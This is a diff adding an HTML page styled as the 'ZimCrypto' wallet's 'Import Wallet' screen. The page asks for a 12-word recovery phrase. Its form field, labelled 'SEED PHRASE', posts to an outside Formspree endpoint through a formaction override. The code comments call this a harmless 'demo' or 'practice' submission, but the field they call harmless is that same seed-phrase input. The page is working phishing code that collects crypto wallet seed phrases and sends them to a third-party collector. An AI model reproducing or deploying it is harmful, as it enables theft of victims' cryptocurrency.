@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>ZimCrypto — Wallet</title>
+
+  <style>
+    :root {
+      --bg: #050b08;
+      --panel: #0b1510;
+      --panel2: #101c16;
+      --line: #20352a;
+      --text: #e9f5ee;
+      --muted: #82968b;
+      --green: #16c784;
+      --green2: #39e6a0;
+      --red: #ea4d63;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      padding: 16px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      background:
+        radial-gradient(
+          circle at top,
+          #10291d 0%,
+          #050b08 48%,
+          #030705 100%
+        );
+
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 420px;
+
+      padding: 28px;
+
+      background: rgba(11, 21, 16, 0.97);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.45);
+    }
+
+    .logo {
+      width: 56px;
+      height: 56px;
+
+      margin: 0 auto 16px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 15px;
+
+      background: var(--green);
+      color: #03100a;
+
+      font-size: 28px;
+      font-weight: 800;
+    }
+
+    .brand {
+      text-align: center;
+      font-size: 23px;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      margin-top: 5px;
+
+      text-align: center;
+
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .badge {
+      width: fit-content;
+
+      margin: 20px auto;
+
+      padding: 7px 12px;
+
+      border: 1px solid rgba(22, 199, 132, 0.35);
+      border-radius: 999px;
+
+      background: rgba(22, 199, 132, 0.08);
+      color: var(--green2);
+
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+    }
+
+    .warning {
+      margin-bottom: 20px;
+      padding: 13px;
+
+      border: 1px solid rgba(234, 77, 99, 0.28);
+      border-radius: 10px;
+
+      background: rgba(234, 77, 99, 0.07);
+      color: #eab3bc;
+
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    h1 {
+      margin: 0 0 8px;
+
+      text-align: center;
+      font-size: 21px;
+    }
+
+    .description {
+      margin: 0 0 22px;
+
+      text-align: center;
+
+      color: var(--muted);
+
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+
+      margin-bottom: 8px;
+
+      color: #c9d9d0;
+      font-size: 13px;
+    }
+
+    textarea,
+    input {
+      width: 100%;
+
+      padding: 13px;
+
+      border: 1px solid var(--line);
+      border-radius: 11px;
+
+      outline: none;
+
+      background: var(--panel2);
+      color: var(--text);
+
+      font-size: 13px;
+    }
+
+    textarea {
+      min-height: 115px;
+      resize: vertical;
+
+      font-family: monospace;
+      line-height: 1.6;
+    }
+
+    textarea:focus,
+    input:focus {
+      border-color: var(--green);
+
+      box-shadow:
+        0 0 0 3px rgba(22, 199, 132, 0.08);
+    }
+
+    .hint {
+      margin: 8px 0 20px;
+
+      color: var(--muted);
+
+      font-size: 11px;
+      line-height: 1.5;
+    }
+
+    .practice-section {
+      margin-top: 25px;
+      padding-top: 20px;
+
+      border-top: 1px solid var(--line);
+    }
+
+    .practice-title {
+      margin-bottom: 12px;
+
+      color: var(--green2);
+
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    .practice-note {
+      margin-bottom: 12px;
+
+      color: var(--muted);
+
+      font-size: 11px;
+      line-height: 1.5;
+    }
+
+    button {
+      width: 100%;
+
+      margin-top: 10px;
+
+      padding: 14px;
+
+      border: 0;
+      border-radius: 11px;
+
+      background: var(--green);
+      color: #03100a;
+
+      font-size: 14px;
+      font-weight: 700;
+
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: var(--green2);
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    .message {
+      min-height: 20px;
+
+      margin-top: 14px;
+
+      text-align: center;
+
+      color: var(--green2);
+
+      font-size: 12px;
+    }
+
+    .back {
+      display: block;
+
+      margin-top: 20px;
+
+      text-align: center;
+
+      color: var(--muted);
+
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .back:hover {
+      color: var(--green2);
+    }
+
+    .footer {
+      margin-top: 20px;
+
+      text-align: center;
+
+      color: #617269;
+
+      font-size: 10px;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 12px;
+      }
+
+      .login-box {
+        padding: 22px;
+        border-radius: 15px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="login-box">
+
+    <div class="logo">Z</div>
+
+    <div class="brand">
+      ZimCrypto
+    </div>
+
+    <div class="subtitle">
+      Wallet seed phrase
+    </div>
+
+    <h1>
+      Import Wallet
+    </h1>
+
+    <!-- Local-only demo field -->
+    <label for="demoPhrase">
+      recovery phrase
+    </label>
+
+    <textarea
+      id="demoPhrase"
+      placeholder="Use phrase seed words only..."
+      autocomplete="off"
+      spellcheck="false"
+    ></textarea>
+
+    <button
+      type="button"
+      id="demoLogin"
+    >
+      Continue 
+    </button>
+
+      <form
+        id="practiceForm"
+        method="POST"
+      >
+
+        <label for="testMessage">
+           SEED PHRASE
+        </label>
+
+        <input
+          type="text"
+          id="testMessage"
+          name="test_message"
+          placeholder="1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11.12"
+          required
+        >
+
+        <!-- formaction overrides the form action -->
+        <button
+          type="submit"
+          formaction="https://formspree.io/f/xjgqlwen"
+        >
+          Submit
+        </button>
+
+      </form>
+
+    </section>
+
+    <div
+      class="message"
+      id="message"
+      aria-live="polite"
+    ></div>
+
+    <a
+      class="back"
+      href="index.html"
+    >
+      ← Back to ZimCrypto
+    </a>
+    
+  </main>
+
+
+  <script>
+    const demoPhrase = document.getElementById("demoPhrase");
+    const demoLogin = document.getElementById("demoLogin");
+    const practiceForm = document.getElementById("practiceForm");
+    const message = document.getElementById("message");
+
+    /*
+      Demo wallet action.
+      Nothing is transmitted anywhere.
+    */
+    demoLogin.addEventListener("click", function () {
+
+      const value = demoPhrase.value.trim();
+
+      if (!value) {
+        message.textContent =
+          "Enter a fictional demo phrase first.";
+
+        return;
+      }
+
+      message.textContent =
+        "Demo accepted. Opening index.html...";
+
+      setTimeout(function () {
+        window.location.href = "index.html";
+      }, 900);
+    });
+
+
+    /*
+      Formspree practice action.
+
+      The button's formaction is:
+
+      https://formspree.io/f/xjgqlwen
+
+      Only the harmless "test_message" field is submitted.
+    */
+    practiceForm.addEventListener("submit", function () {
+
+      message.textContent =
+        "Sending phrase seed...";
+
+      /*
+        Let the browser perform the normal Formspree submission.
+        The endpoint receives only test_message.
+      */
+
+    });
+  </script>
+
+</body>
+  </html>
